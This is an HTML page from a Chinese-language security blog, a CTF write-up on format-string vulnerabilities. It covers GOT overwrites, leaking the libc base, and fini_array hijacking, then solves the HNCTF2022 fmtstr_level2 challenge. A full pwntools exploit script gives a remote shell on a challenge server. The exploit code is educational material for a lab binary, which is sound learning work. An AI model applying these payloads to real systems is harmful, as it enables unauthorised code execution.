@@ -1,0 +1,86 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>格式化字符串任意写&amp;泄露基址 | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>格式化字符串任意写&amp;泄露基址</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2022-10-12T02:25:53.000Z" id="date"> 2022-10-12</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-10-12T05:25:08.173Z" id="updated"> 2022-10-12</time></div></span></div></div><hr><div id="post-content"><p>本篇主要讲述两个知识点： 格式化字符串任意写和泄露基址</p>
+<p>我们在最初的格式化字符串漏洞学习中 已经掌握了查看偏移和篡改地址的数据的能力</p>
+<p>但是如果是篡改puts函数的got表呢？</p>
+<p>我们知道 动态链接的情况下 当我们调用一个函数时</p>
+<p>他会寻址其got表内存储的真实地址(即对应函数在libc文件中的地址) 从而成功调用</p>
+<p>如果我们将其got表内存储的真实地址修改为其他函数的真实地址</p>
+<p>那么当程序调用原函数时 就相当于调用了篡改后的函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(offset, &#123;puts_got:system_addr &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>以上述payload为例 假设我们需要修改puts函数的got表 使其为system函数的地址</p>
+<p>那么我们就可以这样构造payload(这里注意一下，fmtstr这个工具是会自己补齐字长的 这将影响到我们下文中一道例题 现在留个意就行了)</p>
+<p>ps:并且这个工具默认生成的是32位情况下 如果需要切换到64位 需要自己手动添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch = &quot;amd64&quot;</span><br></pre></td></tr></table></figure>
+
+<p>但是一般题目除非出题人好心 不然真实地址还是得我们自己泄露的吧</p>
+<p>那如何一并利用格式化字符串泄露函数的真实地址呢？</p>
+<p>还记不记得 格式化字符串最开始的漏洞利用 就是泄露栈上的内容 如果我们将got表写入栈上 那是不是也可以通过格式化字符串漏洞将其泄露出来？</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%n$s&quot;</span>.ljust(<span class="number">16</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(puts_got)</span><br></pre></td></tr></table></figure>
+
+<p>这里有几点要注意一下 一个是n 注意是地址所在的偏移</p>
+<p>还有一点是格式化字符这里选择的是s </p>
+<p>最后一个疑惑在于为什么要用\x00补齐16个字节 这个我也不懂 死记就完事了(你也可以试试不补齐 然后看会泄露个啥出来)</p>
+<p>好了 接下来用一题例题来演示一下 方便理解(例题还涉及到了fini劫持的知识点 不懂的话建议先去看另外一篇)</p>
+<h2 id="HNCTF2022-WEEK2-fmtstr-level2"><a href="#HNCTF2022-WEEK2-fmtstr-level2" class="headerlink" title="HNCTF2022-[WEEK2]fmtstr_level2"></a>HNCTF2022-[WEEK2]fmtstr_level2</h2><p>附件有给libc文件 猜测要用到泄露基址</p>
+<p>checksec看一下进制和保护</p>
+<p><img src="https://s1.328888.xyz/2022/10/12/8j0jj.png" alt="8j0jj.png"></p>
+<p>有canary 要么泄露绕过 要么就不能栈溢出了</p>
+<p>再看一下程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">296</span>]; <span class="comment">// [rsp+0h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the game of formatting strings&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Be careful, you only get one shot at this game&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;First please tell me your game ID&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Okk,try to hack it;sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>唯一看起来有价值的就只有main函数了 没有任何的后门函数 甚至buf的字节也不够栈溢出</p>
+<p>但是注意看 最后的puts输出的字符串有sh</p>
+<p>那么可以猜测出题目的解法是修改got表</p>
+<p>结果我们只有一次格式化字符串任意写的机会 好像并不能满足泄露地址后再修改got表的需求</p>
+<p>但是如果我们将fini_array的值改为main函数 那么程序结束后 就会重新返回到main函数 那么我们就有了第二次利用格式化字符串的机会</p>
+<p>于是解题思路可以分为两步</p>
+<p>1.修改fini_array和泄露函数真实地址</p>
+<p>2.将puts_got修改为system函数</p>
+<p>那么接下来开始编写exp</p>
+<p>gdb查看了偏移以后 发现我们输入的第一个字长的数据位于偏移6的地方</p>
+<p>第一个payload的难点在于搞清楚两个格式化字符串的偏移和payload的结构</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;fini_addr:main_addr&#125;)</span><br><span class="line">payload += <span class="string">b&quot;%17$s&quot;</span>.ljust(<span class="number">16</span>,<span class="string">b&quot;\x00&quot;</span>)+p64(puts_got)  //<span class="number">6</span>+<span class="number">8</span>（第一行payload字节数<span class="number">64</span>）+<span class="number">2</span>+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>按照我们上文所说的是不是应该这么构造payload 但是你会发现最后泄露出来的地址是</p>
+<p><img src="https://s1.328888.xyz/2022/10/12/80LAP.png" alt="80LAP.png"></p>
+<p>aaaaba+fini_array的地址(0x4031f0)</p>
+<p>前面的aaaaba是什么东西？</p>
+<p>我们打印出fmtstr构造的数据看看</p>
+<p><img src="https://s1.328888.xyz/2022/10/12/80a9h.png" alt="80a9h.png"></p>
+<p>可以看到aaaaba出自这里 这里就是我们上文所说到的fmtstr的自动补齐一个字长</p>
+<p>而后面的\x00也是为了传送地址(但是地址只有三字节 所以需要5个\x00才补齐一个字长)</p>
+<p>那么说回我们刚才的错误 其原因在于我们需要将格式化字符串放在一起 地址放在一起</p>
+<p>才能两次利用一个漏洞点</p>
+<p>所以 正确的payload应该把aaaaba替换成泄露地址的格式化字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\xf01@\x00\x00\x00\x00\x00\xf11@\x00\x00\x00\x00\x00\xf21@\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(puts_got)</span><br></pre></td></tr></table></figure>
+
+<p>但是这里我们会发现 recv接收到的数据太多了 像ret2libc中的接收办法显然是会出错的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>这里用到[-6:]   只接收后六个字节</p>
+<p>那么我们此时成功进行了fini劫持 我们再输入io.recv()就会发现又接收到了main函数开始时puts的那些字符串</p>
+<p>第二次的payload就简单至极了 最后放下完整的exp吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28466</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;First please tell me your game ID&quot;</span>)</span><br><span class="line">fini_addr = <span class="number">0x4031F0</span></span><br><span class="line">main_addr = <span class="number">0x4011b6</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\xf01@\x00\x00\x00\x00\x00\xf11@\x00\x00\x00\x00\x00\xf21@\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">hex</span>(libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io.recv()</span><br><span class="line">io.recvuntil(<span class="string">&quot;First please tell me your game ID&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;puts_got:system_addr&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/10/12/fini%E5%8A%AB%E6%8C%81/">← Next fini劫持</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/10/09/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/">密码学笔记 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>ChenBlog</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF2022-WEEK2-fmtstr-level2"><span class="toc-number">1.</span> <span class="toc-text">HNCTF2022-[WEEK2]fmtstr_level2</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
